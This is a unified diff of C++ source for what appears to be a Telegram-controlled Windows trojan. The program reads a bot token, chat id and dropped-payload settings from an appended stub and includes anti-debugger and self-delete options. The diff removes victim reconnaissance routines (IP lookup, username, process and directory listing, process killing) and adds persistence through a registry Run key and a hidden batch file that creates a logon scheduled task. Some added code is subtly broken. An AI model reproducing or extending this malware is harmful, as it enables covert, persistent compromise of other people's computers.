@@ -44,69 +44,38 @@ void ReadData(Settings* s) {
 	stub.read((char*)&s->botapi, sizeof(s->botapi));
 	stub.read((char*)&s->chatid, sizeof(s->chatid));
 	stub.read((char*)&s->drop, sizeof(s->drop));
-	stub.read((char*)&s->client_delay, sizeof(int));
-	stub.read((char*)&s->autorun, sizeof(s->autorun));
-	stub.read((char*)&s->auto_delete, sizeof(bool));
-	stub.read((char*)&s->autorun_state, sizeof(bool));
 	stub.read((char*)&s->drop_run, sizeof(bool));
+
+	stub.read((char*)&s->scheduler_name, sizeof(s->scheduler_name));
+	stub.read((char*)&s->scheduler_state, sizeof(bool));
+
+	stub.read((char*)&s->client_delay, sizeof(s->client_delay));
+	stub.read((char*)&s->autorun, sizeof(s->autorun));
+	stub.read((char*)&s->autorun_state, sizeof(bool));
+
+	stub.read((char*)&s->auto_delete, sizeof(bool));
 	stub.read((char*)&s->protect_debuggers, sizeof(bool));
 
 	stub.close();
 }
 
-std::string GetOS() {
-	OSVERSIONINFOEX info;
-	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
-	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionEx((LPOSVERSIONINFO)&info);
-
-	double version;
-
-	version = info.dwMajorVersion
-		+ (info.dwMinorVersion / 10.0)
-		- (info.wProductType == VER_NT_WORKSTATION) ? 0.5 : 0.0;
-
-	return std::to_string(version);
-}
-
-std::string GetIP() {
-	return GetRequest("api.ipify.org", "4B4DB4B3");
-}
-
-std::string GetPCName() {
-	char buff[512] = { 0 };
-	DWORD len = sizeof(buff) - 1;
-	GetUserNameA(buff, &len);
-	return buff;
-}
-
-std::string ProcessList() {
-	std::string list = "";
-	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (hSnap != NULL) {
-		PROCESSENTRY32 pe32;
-		pe32.dwSize = sizeof(PROCESSENTRY32);
-
-		if (Process32First(hSnap, &pe32)) {
-			do {
-				list.append(pe32.szExeFile);
-				list.append("%0A");
-			} while (Process32Next(hSnap, &pe32));
-		}
-	}
-	return list;
-}
-
-void Autorun(const char* name) {
+void Autorun(const char* path, const char* name) {
 	HKEY reg_key = 0;
 	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, address, 0, KEY_ALL_ACCESS, &reg_key);
 
-	char me[128] = { 0 };
-	GetModuleFileName(NULL, me, sizeof(me) - 1);
-	result = RegSetValueEx(reg_key, name, 0, REG_SZ, (LPBYTE)me, sizeof(me) - 1);
+	result = RegSetValueEx(reg_key, path, 0, REG_SZ, (LPBYTE)path, sizeof(path) - 1);
 
 	RegCloseKey(reg_key);
+}
+
+void Scheduler(const char* path, const char* name) {
+	std::ofstream schd("scheduler.bat");
+	schd << "@echo off \n";
+	schd << "SCHTASKS /CREATE /SC ONLOGON /TN \"" + std::string(name) + "\" /TR \"" + std::string(path);
+	schd.close();
+
+	ShellExecuteA(0, "open", "scheduler.bat", 0, 0, SW_HIDE);
 }
 
 std::string ToLower(std::string str) {
@@ -145,58 +114,13 @@ bool FileExists(std::string name) {
 	return (stat(name.c_str(), &buffer) == 0);
 }
 
-std::vector<std::string> split(std::string str, char delim)
-{
+std::vector<std::string> split(std::string str, char delim) {
 	std::stringstream ss(str);
-	std::string item;
-	std::vector<std::string> splittedStrings;
-	while (std::getline(ss, item, delim))
+	std::string word;
+	std::vector<std::string> splittened;
+	while (std::getline(ss, word, delim))
 	{
-		splittedStrings.push_back(item);
+		splittened.push_back(word);
 	}
-	return splittedStrings;
-}
-
-bool CloseProcessByName(std::string procname) {
-	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (hSnap != NULL) {
-		PROCESSENTRY32 pe32;
-		pe32.dwSize = sizeof(PROCESSENTRY32);
-		if (Process32First(hSnap, &pe32)) {
-			do {
-				if (strcmp(pe32.szExeFile, procname.c_str()) == 0) {
-					HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
-					if (hProc != NULL) {
-						TerminateProcess(hProc, 0);
-						CloseHandle(hProc);
-						return true;
-					}
-					else {
-						return false;
-					}
-				}
-			} while (Process32Next(hSnap, &pe32));
-		}
-	}
-	return false;
-}
-
-std::string DirectoryObjectsList(std::string dir) {
-	std::string names;
-	std::string search_path = dir + "/*";
-	WIN32_FIND_DATA fd;
-	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
-	int index = 0;
-	if (hFind != INVALID_HANDLE_VALUE) {
-		do {
-			if (index <= 1) {
-				index++;
-				continue;
-			}
-			names.append(fd.cFileName);
-			names.append("%0A");
-		} while (::FindNextFile(hFind, &fd));
-		::FindClose(hFind);
-	}
-	return names;
+	return splittened;
 }
